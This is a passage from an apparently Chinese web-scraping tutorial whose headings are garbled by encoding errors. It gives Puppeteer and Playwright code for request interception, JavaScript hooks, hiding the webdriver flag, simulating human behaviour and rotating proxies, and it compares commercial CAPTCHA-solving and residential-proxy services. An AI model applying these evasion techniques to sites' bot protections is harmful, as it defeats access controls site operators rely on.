<h3>æ‹¦æˆªå’Œä¿®æ”¹è¯·æ±‚</h3>
<pre><code class="language-javascript">const page = await browser.newPage();

// å¯ç”¨è¯·æ±‚æ‹¦æˆª
await page.setRequestInterception(true);

page.on(&quot;request&quot;, (request) =&gt; {
  // æ‹¦æˆªç‰¹å®š URL
  if (request.url().includes(&quot;/api/data&quot;)) {
    // ä¿®æ”¹è¯·æ±‚å¤´
    request.continue({
      headers: {
        ...request.headers(),
        &quot;X-Custom-Header&quot;: &quot;MyValue&quot;,
      },
    });
  } else {
    request.continue();
  }
});

page.on(&quot;response&quot;, async (response) =&gt; {
  const url = response.url();
  if (url.includes(&quot;/api/data&quot;)) {
    const data = await response.json();
    console.log(&quot;API Response:&quot;, data);
  }
});

await page.goto(&quot;https://example.com&quot;);
</code></pre>
<h3>æ³¨å…¥ Hook è„šæœ¬</h3>
<pre><code class="language-javascript">const page = await browser.newPage();

// åœ¨é¡µé¢åŠ è½½å‰æ³¨å…¥è„šæœ¬
await page.evaluateOnNewDocument(() =&gt; {
  // Hook fetch
  const originalFetch = window.fetch;
  window.fetch = async function (...args) {
    console.log(&quot;[Fetch]&quot;, args[0]);
    const response = await originalFetch.apply(this, args);
    return response;
  };

  // Hook localStorage
  const originalSetItem = localStorage.setItem;
  localStorage.setItem = function (key, value) {
    console.log(&quot;[LocalStorage]&quot;, key, &quot;=&quot;, value);
    return originalSetItem.apply(this, arguments);
  };
});

await page.goto(&quot;https://example.com&quot;);
</code></pre>
<h3>ç»•è¿‡ Webdriver æ£€æµ‹</h3>
<pre><code class="language-javascript">const puppeteer = require(&quot;puppeteer-extra&quot;);
const StealthPlugin = require(&quot;puppeteer-extra-plugin-stealth&quot;);

puppeteer.use(StealthPlugin());

const browser = await puppeteer.launch({
  headless: false,
  args: [
    &quot;--disable-blink-features=AutomationControlled&quot;,
    &quot;--disable-dev-shm-usage&quot;,
    &quot;--no-sandbox&quot;,
  ],
});

const page = await browser.newPage();

// éšè— webdriver ç‰¹å¾
await page.evaluateOnNewDocument(() =&gt; {
  Object.defineProperty(navigator, &quot;webdriver&quot;, {
    get: () =&gt; undefined,
  });

  // ä¼ªé€  Chrome æ’ä»¶
  Object.defineProperty(navigator, &quot;plugins&quot;, {
    get: () =&gt; [1, 2, 3, 4, 5],
  });
});

await page.goto(&quot;https://bot-detection.com&quot;);
</code></pre>
<hr />
<h2>Playwright è„šæœ¬</h2>
<h3>åŸºç¡€æ¨¡æ¿</h3>
<pre><code class="language-javascript">const { chromium } = require(&quot;playwright&quot;);

(async () =&gt; {
  const browser = await chromium.launch({ headless: false });
  const context = await browser.newContext();
  const page = await context.newPage();

  await page.goto(&quot;https://example.com&quot;);
  await page.screenshot({ path: &quot;screenshot.png&quot; });

  await browser.close();
})();
</code></pre>
<h3>å¤šæµè§ˆå™¨æµ‹è¯•</h3>
<pre><code class="language-javascript">const { chromium, firefox, webkit } = require(&quot;playwright&quot;);

async function testAllBrowsers(url) {
  for (const browserType of [chromium, firefox, webkit]) {
    const browser = await browserType.launch();
    const page = await browser.newPage();
    await page.goto(url);

    const title = await page.title();
    console.log(`${browserType.name()}: ${title}`);

    await browser.close();
  }
}

testAllBrowsers(&quot;https://example.com&quot;);
</code></pre>
<h3>ç§»åŠ¨è®¾å¤‡æ¨¡æ‹Ÿ</h3>
<pre><code class="language-javascript">const { devices } = require(&quot;playwright&quot;);

const iPhone = devices[&quot;iPhone 12&quot;];

const browser = await chromium.launch();
const context = await browser.newContext({
  ...iPhone,
  locale: &quot;zh-CN&quot;,
  geolocation: { longitude: 116.4, latitude: 39.9 }, // åŒ—äº¬
  permissions: [&quot;geolocation&quot;],
});

const page = await context.newPage();
await page.goto(&quot;https://example.com&quot;);
</code></pre>
<h3>å¹¶å‘çˆ¬å–</h3>
<pre><code class="language-javascript">async function scrapeMultiplePages(urls) {
  const browser = await chromium.launch();
  const context = await browser.newContext();

  // å¹¶å‘æ‰“å¼€å¤šä¸ªé¡µé¢
  const promises = urls.map(async (url) =&gt; {
    const page = await context.newPage();
    await page.goto(url);

    const data = await page.evaluate(() =&gt; {
      return {
        title: document.title,
        content: document.body.innerText,
      };
    });

    await page.close();
    return data;
  });

  const results = await Promise.all(promises);
  await browser.close();

  return results;
}

const urls = [
  &quot;https://example.com/page1&quot;,
  &quot;https://example.com/page2&quot;,
  &quot;https://example.com/page3&quot;,
];

scrapeMultiplePages(urls).then(console.log);
</code></pre>
<h3>ä¿å­˜ç™»å½•çŠ¶æ€</h3>
<pre><code class="language-javascript">// ç™»å½•å¹¶ä¿å­˜çŠ¶æ€
async function saveLoginState() {
  const browser = await chromium.launch({ headless: false });
  const context = await browser.newContext();
  const page = await context.newPage();

  await page.goto(&quot;https://example.com/login&quot;);
  await page.fill(&quot;#username&quot;, &quot;myuser&quot;);
  await page.fill(&quot;#password&quot;, &quot;mypassword&quot;);
  await page.click(&quot;#login-button&quot;);
  await page.waitForNavigation();

  // ä¿å­˜å­˜å‚¨çŠ¶æ€ï¼ˆåŒ…å« Cookieã€LocalStorage ç­‰ï¼‰
  await context.storageState({ path: &quot;state.json&quot; });
  await browser.close();
}

// åŠ è½½ç™»å½•çŠ¶æ€
async function useLoginState() {
  const browser = await chromium.launch({ headless: false });
  const context = await browser.newContext({
    storageState: &quot;state.json&quot;,
  });
  const page = await context.newPage();

  // ç›´æ¥è®¿é—®éœ€è¦ç™»å½•çš„é¡µé¢
  await page.goto(&quot;https://example.com/dashboard&quot;);

  await browser.close();
}
</code></pre>
<h3>ç½‘ç»œç›‘æ§å’Œ HAR å¯¼å‡º</h3>
<pre><code class="language-javascript">const context = await browser.newContext({
  recordHar: { path: &quot;network.har&quot; },
});

const page = await context.newPage();
await page.goto(&quot;https://example.com&quot;);

// æ“ä½œé¡µé¢...

await context.close(); // HAR æ–‡ä»¶ä¼šè‡ªåŠ¨ä¿å­˜
</code></pre>
<hr />
<h2>è¿›é˜¶æŠ€å·§</h2>
<h3>1. äººç±»è¡Œä¸ºæ¨¡æ‹Ÿ</h3>
<pre><code class="language-javascript">// éšæœºå»¶è¿Ÿ
function randomDelay(min = 100, max = 500) {
  return Math.floor(Math.random() * (max - min + 1) + min);
}

// æ¨¡æ‹ŸçœŸå®æ‰“å­—
async function typeHuman(page, selector, text) {
  await page.click(selector);
  for (const char of text) {
    await page.type(selector, char);
    await page.waitForTimeout(randomDelay(50, 150));
  }
}

// éšæœºé¼ æ ‡ç§»åŠ¨
async function randomMouseMove(page) {
  const x = Math.floor(Math.random() * 800);
  const y = Math.floor(Math.random() * 600);
  await page.mouse.move(x, y);
}
</code></pre>
<h3>2. ä»£ç†æ± é›†æˆ</h3>
<pre><code class="language-javascript">const proxies = [
  &quot;http://proxy1.com:8080&quot;,
  &quot;http://proxy2.com:8080&quot;,
  &quot;http://proxy3.com:8080&quot;,
];

async function scrapeWithProxy(url) {
  const proxy = proxies[Math.floor(Math.random() * proxies.length)];

  const browser = await chromium.launch({
    proxy: { server: proxy },
  });

  const page = await browser.newPage();
  await page.goto(url);

  // çˆ¬å–æ•°æ®...

  await browser.close();
}
</code></pre>
<h3>3. å¤±è´¥é‡è¯•</h3>
<pre><code class="language-javascript">async function retryOperation(operation, maxRetries = 3) {
  for (let i = 0; i &lt; maxRetries; i++) {
    try {
      return await operation();
    } catch (error) {
      console.log(`Attempt ${i + 1} failed:`, error.message);
      if (i === maxRetries - 1) throw error;
      await new Promise((resolve) =&gt; setTimeout(resolve, 1000 * (i + 1)));
    }
  }
}

// ä½¿ç”¨
await retryOperation(async () =&gt; {
  await page.goto(&quot;https://example.com&quot;);
  await page.click(&quot;#button&quot;);
});
</code></pre>
<hr />
<h2>å®Œæ•´çˆ¬è™«ç¤ºä¾‹</h2>
<pre><code class="language-javascript">const puppeteer = require(&quot;puppeteer-extra&quot;);
const StealthPlugin = require(&quot;puppeteer-extra-plugin-stealth&quot;);
const fs = require(&quot;fs&quot;);

puppeteer.use(StealthPlugin());

class WebScraper {
  constructor() {
    this.browser = null;
    this.page = null;
  }

  async init() {
    this.browser = await puppeteer.launch({
      headless: false,
      args: [&quot;--no-sandbox&quot;],
    });
    this.page = await this.browser.newPage();
    await this.page.setViewport({ width: 1920, height: 1080 });
  }

  async login(username, password) {
    await this.page.goto(&quot;https://example.com/login&quot;);
    await this.page.type(&quot;#username&quot;, username, { delay: 100 });
    await this.page.type(&quot;#password&quot;, password, { delay: 100 });
    await this.page.click(&quot;#login-button&quot;);
    await this.page.waitForNavigation();
  }

  async scrapeData(url) {
    await this.page.goto(url);

    const data = await this.page.evaluate(() =&gt; {
      const items = [];
      document.querySelectorAll(&quot;.item&quot;).forEach((item) =&gt; {
        items.push({
          title: item.querySelector(&quot;.title&quot;)?.innerText,
          price: item.querySelector(&quot;.price&quot;)?.innerText,
          link: item.querySelector(&quot;a&quot;)?.href,
        });
      });
      return items;
    });

    return data;
  }

  async close() {
    await this.browser.close();
  }
}

// ä½¿ç”¨
(async () =&gt; {
  const scraper = new WebScraper();
  await scraper.init();
  await scraper.login(&quot;myuser&quot;, &quot;mypassword&quot;);

  const data = await scraper.scrapeData(&quot;https://example.com/products&quot;);
  fs.writeFileSync(&quot;data.json&quot;, JSON.stringify(data, null, 2));

  await scraper.close();
})();
</code></pre>
<hr />
<h2>å•†ä¸šåŒ–æµè§ˆå™¨è‡ªåŠ¨åŒ–è§£å†³æ–¹æ¡ˆå¯¹æ¯”</h2>
<p>åœ¨å¤§è§„æ¨¡æ•°æ®é‡‡é›†å’Œè‡ªåŠ¨åŒ–æµ‹è¯•åœºæ™¯ä¸­ï¼Œå•†ä¸šåŒ–æœåŠ¡å¯ä»¥æ˜¾è‘—é™ä½è¿ç»´æˆæœ¬å’ŒæŠ€æœ¯é—¨æ§›ã€‚ä»¥ä¸‹æ˜¯å¸‚åœºä¸»æµæ–¹æ¡ˆçš„è¯¦ç»†å¯¹æ¯”ã€‚</p>
<h3>1. å•†ä¸šæµè§ˆå™¨äº‘æœåŠ¡ï¼ˆBrowser-as-a-Serviceï¼‰</h3>
<h4>Browserless.io</h4>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>:</p>
<ul>
<li>æ‰˜ç®¡å¼æ— å¤´æµè§ˆå™¨æœåŠ¡</li>
<li>è‡ªåŠ¨æ‰©å±•ï¼Œæ— éœ€è¿ç»´</li>
<li>å†…ç½®åæ£€æµ‹å’Œä»£ç†æ± </li>
<li>æ”¯æŒ Puppeteer/Playwright API</li>
</ul>
<p><strong>å®šä»·</strong>:</p>
<ul>
<li>Hobby: $29/æœˆï¼ˆ10,000 æ¬¡è¯·æ±‚ï¼‰</li>
<li>Startup: $79/æœˆï¼ˆ50,000 æ¬¡è¯·æ±‚ï¼‰</li>
<li>Business: $299/æœˆï¼ˆ250,000 æ¬¡è¯·æ±‚ï¼‰</li>
<li>Enterprise: å®šåˆ¶åŒ–</li>
</ul>
<p><strong>æŠ€æœ¯è§„æ ¼</strong>:</p>
<pre><code class="language-javascript">// ä½¿ç”¨ç¤ºä¾‹ - ä¸ Puppeteer å®Œå…¨å…¼å®¹
const browser = await puppeteer.connect({
  browserWSEndpoint: &quot;wss://chrome.browserless.io?token=YOUR_TOKEN&quot;,
});
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>:</p>
<ul>
<li>PDF ç”ŸæˆæœåŠ¡</li>
<li>ç½‘é¡µæˆªå›¾ API</li>
<li>è½»é‡çº§çˆ¬è™«ï¼ˆ&lt; 100 ä¸‡é¡µ/æœˆï¼‰</li>
</ul>
<p><strong>å®˜ç½‘</strong>: https://www.browserless.io/</p>
<p><strong>ä¼˜åŠ£åˆ†æ</strong>:</p>
<ul>
<li>âœ… é›¶è¿ç»´æˆæœ¬</li>
<li>âœ… æŒ‰éœ€ä»˜è´¹</li>
<li>âŒ å—é™äºä¾›åº”å•†ç½‘ç»œ</li>
<li>âŒ å¤§è§„æ¨¡åœºæ™¯æˆæœ¬é«˜</li>
</ul>
<hr />
<h4>BrowserStack Automate</h4>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>:</p>
<ul>
<li>2000+çœŸå®è®¾å¤‡å’Œæµè§ˆå™¨ç»„åˆ</li>
<li>ä¼ä¸šçº§å¯é æ€§ï¼ˆ99.9% SLAï¼‰</li>
<li>è¯¦ç»†çš„æµ‹è¯•æŠ¥å‘Šå’Œè§†é¢‘å½•åˆ¶</li>
<li>ä¸ CI/CD æ— ç¼é›†æˆ</li>
</ul>
<p><strong>å®šä»·</strong>:</p>
<ul>
<li>Team: $29/æœˆï¼ˆ1 ä¸ªå¹¶å‘ï¼‰</li>
<li>Business: $99/æœˆï¼ˆ5 ä¸ªå¹¶å‘ï¼‰</li>
<li>Enterprise: $299/æœˆèµ·ï¼ˆ25 ä¸ªå¹¶å‘ï¼‰</li>
</ul>
<p><strong>æŠ€æœ¯è§„æ ¼</strong>:</p>
<pre><code class="language-javascript">// Selenium é›†æˆ
const caps = {
  &quot;bstack:options&quot;: {
    userName: &quot;YOUR_USERNAME&quot;,
    accessKey: &quot;YOUR_KEY&quot;,
  },
  browserName: &quot;Chrome&quot;,
  browserVersion: &quot;latest&quot;,
};
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>:</p>
<ul>
<li>è·¨æµè§ˆå™¨å…¼å®¹æ€§æµ‹è¯•</li>
<li>ç§»åŠ¨ç«¯è‡ªåŠ¨åŒ–æµ‹è¯•</li>
<li>ä¼ä¸šçº§ QA è‡ªåŠ¨åŒ–</li>
</ul>
<p><strong>å®˜ç½‘</strong>: https://www.browserstack.com/</p>
<p><strong>ç«å“å¯¹æ¯”</strong>:</p>
<ul>
<li>Sauce Labsï¼ˆç±»ä¼¼å®šä»·å’ŒåŠŸèƒ½ï¼‰</li>
<li>LambdaTestï¼ˆæ›´ä¾¿å®œï¼Œ$15/æœˆèµ·ï¼‰</li>
</ul>
<hr />
<h4>Apify</h4>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>:</p>
<ul>
<li>ä¸“ä¸šç½‘é¡µçˆ¬å–å¹³å°</li>
<li>1000+ ç°æˆçš„çˆ¬è™« Actor</li>
<li>å†…ç½®ä»£ç†æ± å’Œåæ£€æµ‹</li>
<li>Serverless æ¶æ„</li>
</ul>
<p><strong>å®šä»·</strong>:</p>
<ul>
<li>Free: $0ï¼ˆæ¯æœˆ$5 é¢åº¦ï¼‰</li>
<li>Personal: $49/æœˆ</li>
<li>Team: $499/æœˆ</li>
<li>Enterprise: å®šåˆ¶åŒ–</li>
</ul>
<p><strong>æŠ€æœ¯ç‰¹ç‚¹</strong>:</p>
<pre><code class="language-javascript">// Actor ç¤ºä¾‹ - çˆ¬å–Googleæœç´¢
const Apify = require(&quot;apify&quot;);

Apify.main(async () =&gt; {
  const requestQueue = await Apify.openRequestQueue();
  await requestQueue.addRequest({ url: &quot;https://google.com&quot; });

  const crawler = new Apify.PuppeteerCrawler({
    requestQueue,
    handlePageFunction: async ({ page, request }) =&gt; {
      const title = await page.title();
      console.log(`Title: ${title}`);
    },
  });

  await crawler.run();
});
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>:</p>
<ul>
<li>ä¸­å¤§è§„æ¨¡æ•°æ®é‡‡é›†</li>
<li>å¸‚åœºç›‘æµ‹å’Œä»·æ ¼è¿½è¸ª</li>
<li>æ— éœ€ç»´æŠ¤åŸºç¡€è®¾æ–½çš„å›¢é˜Ÿ</li>
</ul>
<p><strong>å®˜ç½‘</strong>: https://apify.com/</p>
<hr />
<h3>2. éªŒè¯ç æ‰“ç æœåŠ¡å¯¹æ¯”</h3>
<table>
<thead>
<tr>
  <th>æœåŠ¡å•†</th>
  <th>reCAPTCHA v2</th>
  <th>reCAPTCHA v3</th>
  <th>hCaptcha</th>
  <th>æ»‘å—éªŒè¯ç </th>
  <th>ä»·æ ¼ï¼ˆ1000 æ¬¡ï¼‰</th>
  <th>æˆåŠŸç‡</th>
  <th>é€Ÿåº¦</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>2Captcha</strong></td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>$2.99</td>
  <td>95%+</td>
  <td>10-30s</td>
</tr>
<tr>
  <td><strong>Anti-Captcha</strong></td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>$2.00</td>
  <td>96%+</td>
  <td>8-25s</td>
</tr>
<tr>
  <td><strong>CapSolver</strong></td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>$1.50</td>
  <td>94%+</td>
  <td>15-35s</td>
</tr>
<tr>
  <td><strong>DeathByCaptcha</strong></td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>âŒ</td>
  <td>âœ…</td>
  <td>$1.39</td>
  <td>92%+</td>
  <td>20-40s</td>
</tr>
<tr>
  <td><strong>CapMonster Cloud</strong></td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>$0.90</td>
  <td>93%+</td>
  <td>15-30s</td>
</tr>
</tbody>
</table>
<h4>æ¨èæ–¹æ¡ˆ</h4>
<p><strong>2Captcha</strong>ï¼ˆæœ€å¯é ï¼‰</p>
<pre><code class="language-javascript">const solver = new Captcha.Solver(&quot;YOUR_API_KEY&quot;);

const result = await solver.recaptcha({
  pageurl: &quot;https://example.com&quot;,
  googlekey: &quot;6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-&quot;,
  version: &quot;v2&quot;,
});

console.log(&quot;Token:&quot;, result.data);
</code></pre>
<p><strong>å®˜ç½‘</strong>: https://2captcha.com/
<strong>æˆæœ¬ä¼°ç®—</strong>: 10 ä¸‡æ¬¡éªŒè¯ç  â‰ˆ $300</p>
<hr />
<p><strong>Anti-Captcha</strong>ï¼ˆé€Ÿåº¦æœ€å¿«ï¼‰</p>
<ul>
<li>æ”¯æŒæµè§ˆå™¨æ‰©å±•è‡ªåŠ¨é›†æˆ</li>
<li>æä¾› Puppeteer/Playwright æ’ä»¶</li>
</ul>
<p><strong>å®˜ç½‘</strong>: https://anti-captcha.com/</p>
<hr />
<h3>3. ä»£ç† IP æœåŠ¡å¯¹æ¯”</h3>
<h4>ä½å®…ä»£ç†ï¼ˆResidential Proxyï¼‰</h4>
<p><strong>Bright Data</strong>ï¼ˆåŸ Luminatiï¼‰</p>
<ul>
<li>æœ€å¤§çš„ä½å®… IP æ± ï¼ˆ7200 ä¸‡+ï¼‰</li>
<li>æŒ‰æµé‡è®¡è´¹ï¼š$12.75/GB èµ·</li>
<li>ä¼ä¸šçº§å¯é æ€§</li>
<li><strong>å®˜ç½‘</strong>: https://brightdata.com/</li>
</ul>
<p><strong>Smartproxy</strong></p>
<ul>
<li>4000 ä¸‡+ ä½å®… IP</li>
<li>æŒ‰æµé‡è®¡è´¹ï¼š$12.50/GB èµ·</li>
<li>æ›´å‹å¥½çš„å®šä»·</li>
<li><strong>å®˜ç½‘</strong>: https://smartproxy.com/</li>
</ul>
<p><strong>å¯¹æ¯”</strong>:</p>
<table>
<thead>
<tr>
  <th>ç‰¹æ€§</th>
  <th>Bright Data</th>
  <th>Smartproxy</th>
  <th>Oxylabs</th>
</tr>
</thead>
<tbody>
<tr>
  <td>IP æ± å¤§å°</td>
  <td>7200 ä¸‡+</td>
  <td>4000 ä¸‡+</td>
  <td>1 äº¿+</td>
</tr>
<tr>
  <td>ä»·æ ¼/GB</td>
  <td>$12.75</td>
  <td>$12.50</td>
  <td>$15.00</td>
</tr>
<tr>
  <td>æœ€ä½æ¶ˆè´¹</td>
  <td>$500/æœˆ</td>
  <td>$75/æœˆ</td>
  <td>$300/æœˆ</td>
</tr>
<tr>
  <td>æˆåŠŸç‡</td>
  <td>99.5%</td>
  <td>99.3%</td>
  <td>99.6%</td>
</tr>
</tbody>
</table>
<hr />
<h4>æ•°æ®ä¸­å¿ƒä»£ç†ï¼ˆDatacenter Proxyï¼‰</h4>
<p><strong>æˆæœ¬ä½ï¼Œé€‚åˆå¤§è§„æ¨¡çˆ¬å–</strong>:</p>
<ul>
<li>Webshare: $2.00/10 ä¸ªä»£ç†/æœˆ</li>
<li>Proxy-Seller: $1.20/IP/æœˆ</li>
<li>ProxyRack: $65/5000 ç«¯å£/æœˆ</li>
</ul>
<p><strong>å±€é™</strong>: æ˜“è¢«è¯†åˆ«ä¸ºä»£ç†ï¼Œå°ç¦ç‡è¾ƒé«˜</p>
<hr />
<h3>4. åˆ†å¸ƒå¼çˆ¬è™«å¹³å°å¯¹æ¯”</h3>
<h4>Scrapy Cloudï¼ˆScrapinghubï¼‰</h4>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>Scrapy é¡¹ç›®æ‰˜ç®¡</li>
<li>è‡ªåŠ¨æ‰©å±• Crawler</li>
<li>å†…ç½®ä»£ç†å’Œåæ£€æµ‹</li>
</ul>
<p><strong>å®šä»·</strong>:</p>
<ul>
<li>Free: 1 ä¸ªçˆ¬è™«</li>
<li>Professional: $9/æœˆ/çˆ¬è™«</li>
<li>Enterprise: å®šåˆ¶åŒ–</li>
</ul>
<p><strong>å®˜ç½‘</strong>: https://www.zyte.com/scrapy-cloud/</p>
<hr />
<h4>Crawleraï¼ˆæ™ºèƒ½ä»£ç†è·¯ç”±ï¼‰</h4>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>è‡ªåŠ¨åˆ‡æ¢ä»£ç† IP</li>
<li>æ™ºèƒ½é‡è¯•æœºåˆ¶</li>
<li>ç»•è¿‡åçˆ¬è™«</li>
</ul>
<p><strong>å®šä»·</strong>: $25/æœˆèµ·ï¼ˆ10,000 æ¬¡è¯·æ±‚ï¼‰</p>
<p><strong>Python é›†æˆ</strong>:</p>
<pre><code class="language-python">import requests

proxies = {
    'http': 'http://YOUR_API_KEY:@proxy.crawlera.com:8011/'
}

response = requests.get('https://example.com', proxies=proxies)
</code></pre>
<hr />
<h4>ParseHubï¼ˆå¯è§†åŒ–çˆ¬è™«ï¼‰</h4>
<p><strong>ç‰¹ç‚¹</strong>:</p>
<ul>
<li>æ— ä»£ç çˆ¬è™«æ„å»ºå™¨</li>
<li>è‡ªåŠ¨å¤„ç† JavaScript æ¸²æŸ“</li>
<li>äº‘ç«¯è¿è¡Œ</li>
</ul>
<p><strong>å®šä»·</strong>:</p>
<ul>
<li>Free: 5 ä¸ªé¡¹ç›®</li>
<li>Standard: $189/æœˆï¼ˆ20 ä¸ªé¡¹ç›®ï¼‰</li>
<li>Professional: $599/æœˆï¼ˆæ— é™é¡¹ç›®ï¼‰</li>
</ul>
<p><strong>é€‚ç”¨</strong>: éæŠ€æœ¯äººå‘˜ã€å¿«é€ŸåŸå‹</p>
<p><strong>å®˜ç½‘</strong>: https://www.parsehub.com/</p>
<hr />
<h3>5. æˆæœ¬æ•ˆç›Šåˆ†æ</h3>
<h4>æ¡ˆä¾‹ï¼šç”µå•†ä»·æ ¼ç›‘æ§ï¼ˆ100,000 é¡µ/å¤©ï¼‰</h4>
<p><strong>æ–¹æ¡ˆ Aï¼šè‡ªå»º</strong></p>
<ul>
<li>æˆæœ¬ï¼šæœåŠ¡å™¨ $100/æœˆ + ä»£ç† $200/æœˆ = <strong>$300/æœˆ</strong></li>
<li>è¿ç»´ï¼šéœ€è¦ DevOps å·¥ç¨‹å¸ˆ</li>
<li>é£é™©ï¼šéœ€è¦æŒç»­ç»´æŠ¤åæ£€æµ‹</li>
</ul>
<p><strong>æ–¹æ¡ˆ Bï¼šApify</strong></p>
<ul>
<li>æˆæœ¬ï¼šTeam è®¡åˆ’ <strong>$499/æœˆ</strong></li>
<li>è¿ç»´ï¼šé›¶è¿ç»´</li>
<li>é£é™©ï¼šä½ï¼Œå¹³å°è´Ÿè´£åæ£€æµ‹</li>
</ul>
<p><strong>æ–¹æ¡ˆ Cï¼šBright Data + Browserless</strong></p>
<ul>
<li>æˆæœ¬ï¼šä»£ç† $500/æœˆ + æµè§ˆå™¨ $299/æœˆ = <strong>$799/æœˆ</strong></li>
<li>è¿ç»´ï¼šæœ€å°åŒ–</li>
<li>é£é™©ï¼šæœ€ä½ï¼Œä¼ä¸šçº§ SLA</li>
</ul>
<p><strong>ç»“è®º</strong>:</p>
<ul>
<li>&lt; 1 ä¸‡é¡µ/å¤©ï¼šè‡ªå»ºæœ€åˆ’ç®—</li>
<li>1-10 ä¸‡é¡µ/å¤©ï¼šApify æ€§ä»·æ¯”é«˜</li>
<li><blockquote>
<p>10 ä¸‡é¡µ/å¤©ï¼šæ··åˆæ–¹æ¡ˆï¼ˆè‡ªå»º+å•†ä¸šä»£ç†ï¼‰</p>
</blockquote>
</li>
</ul>
<hr />
<h3>6. æŠ€æœ¯é€‰å‹å†³ç­–æ ‘</h3>
<pre><code>éœ€è¦è·¨æµè§ˆå™¨æµ‹è¯•ï¼Ÿ
â”œâ”€ æ˜¯ â†’ BrowserStack/Sauce Labs
â””â”€ å¦ â†’ éœ€è¦å¤§è§„æ¨¡çˆ¬å–ï¼Ÿ
    â”œâ”€ æ˜¯ï¼ˆ&gt;10ä¸‡é¡µ/å¤©ï¼‰â†’ è‡ªå»º + Bright Dataä»£ç†
    â””â”€ å¦ â†’ å›¢é˜Ÿæœ‰DevOpsï¼Ÿ
        â”œâ”€ æ˜¯ â†’ è‡ªå»ºPuppeteer Cluster
        â””â”€ å¦ â†’ Apify/ParseHub
</code></pre>
<hr />
<h3>7. å¼€æº vs å•†ä¸šæ–¹æ¡ˆç»¼åˆå¯¹æ¯”</h3>
<table>
<thead>
<tr>
  <th>ç»´åº¦</th>
  <th>è‡ªå»ºå¼€æº</th>
  <th>åŠæ‰˜ç®¡ï¼ˆApifyï¼‰</th>
  <th>å…¨æ‰˜ç®¡ï¼ˆBrowserStackï¼‰</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>åˆå§‹æˆæœ¬</strong></td>
  <td>ä½</td>
  <td>ä¸­</td>
  <td>ä½</td>
</tr>
<tr>
  <td><strong>è¿è¥æˆæœ¬</strong></td>
  <td>é«˜ï¼ˆäººåŠ›ï¼‰</td>
  <td>ä½</td>
  <td>é›¶</td>
</tr>
<tr>
  <td><strong>å¯æ‰©å±•æ€§</strong></td>
  <td>éœ€è‡ªè¡Œå®ç°</td>
  <td>è‡ªåŠ¨æ‰©å±•</td>
  <td>è‡ªåŠ¨æ‰©å±•</td>
</tr>
<tr>
  <td><strong>æŠ€æœ¯æ§åˆ¶</strong></td>
  <td>å®Œå…¨æ§åˆ¶</td>
  <td>éƒ¨åˆ†æ§åˆ¶</td>
  <td>æœ‰é™æ§åˆ¶</td>
</tr>
<tr>
  <td><strong>å­¦ä¹ æ›²çº¿</strong></td>
  <td>é™¡å³­</td>
  <td>ä¸­ç­‰</td>
  <td>å¹³ç¼“</td>
</tr>
<tr>
  <td><strong>åæ£€æµ‹èƒ½åŠ›</strong></td>
  <td>éœ€è‡ªå·±ç»´æŠ¤</td>
  <td>å¹³å°æä¾›</td>
  <td>å¹³å°æä¾›</td>
</tr>
<tr>
  <td><strong>åˆè§„æ€§</strong></td>
  <td>è‡ªè¡Œè´Ÿè´£</td>
  <td>å¹³å°ååŠ©</td>
  <td>å¹³å°è´Ÿè´£</td>
</tr>
</tbody>
</table>
<hr />
<h3>8. 2025 å¹´æ–°è¶‹åŠ¿</h3>
<h4>AI é©±åŠ¨çš„çˆ¬è™«</h4>
<p><strong>Browse AI</strong></p>
<ul>
<li>æ— ä»£ç  AI çˆ¬è™«è®­ç»ƒ</li>
<li>è‡ªåŠ¨é€‚åº”ç½‘ç«™ç»“æ„å˜åŒ–</li>
<li>ä»·æ ¼ï¼š$49/æœˆèµ·</li>
</ul>
<p><strong>å®˜ç½‘</strong>: https://www.browse.ai/</p>
<hr />
<h4>Playwright æ‰˜ç®¡æœåŠ¡</h4>
<p><strong>Microsoft Playwright Testing</strong>ï¼ˆé¢„è§ˆç‰ˆï¼‰</p>
<ul>
<li>Azure äº‘ç«¯ Playwright æ‰§è¡Œ</li>
<li>ä¸ GitHub Actions é›†æˆ</li>
<li>æŒ‰ä½¿ç”¨é‡è®¡è´¹</li>
</ul>
<p><strong>çŠ¶æ€</strong>: å…¬å¼€é¢„è§ˆ</p>
<hr />
<h3>9. é¿å‘æŒ‡å—</h3>
<p><strong>å¸¸è§é™·é˜±</strong>:</p>
<ol>
<li>âŒ è¿‡åº¦ä¾èµ–å…è´¹æœåŠ¡ï¼ˆç¨³å®šæ€§å·®ï¼‰</li>
<li>âŒ å¿½è§†æ³•å¾‹åˆè§„ï¼ˆçˆ¬è™«åˆæ³•æ€§å®¡æŸ¥ï¼‰</li>
<li>âŒ ä½ä¼°è¿ç»´æˆæœ¬ï¼ˆè‡ªå»ºéœ€è¦ä¸“äººç»´æŠ¤ï¼‰</li>
<li>âŒ é€‰é”™ä»£ç†ç±»å‹ï¼ˆä½å®… vs æ•°æ®ä¸­å¿ƒï¼‰</li>
</ol>
<p><strong>æœ€ä½³å®è·µ</strong>:</p>
<ol>
<li>âœ… ä»å°è§„æ¨¡å¼€å§‹ï¼Œé€æ­¥æ‰©å±•</li>
<li>âœ… æ··åˆä½¿ç”¨å¼€æºå’Œå•†ä¸šå·¥å…·</li>
<li>âœ… è®¾ç½®åˆç†çš„ rate limiting</li>
<li>âœ… å®šæœŸè¯„ä¼°æˆæœ¬æ•ˆç›Š</li>
</ol>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-20">Puppeteer ä¸ Playwright</a></li>
<li>Selenium WebDriver</li>
<li><a href="#section-58">JavaScript Hook è„šæœ¬</a></li>
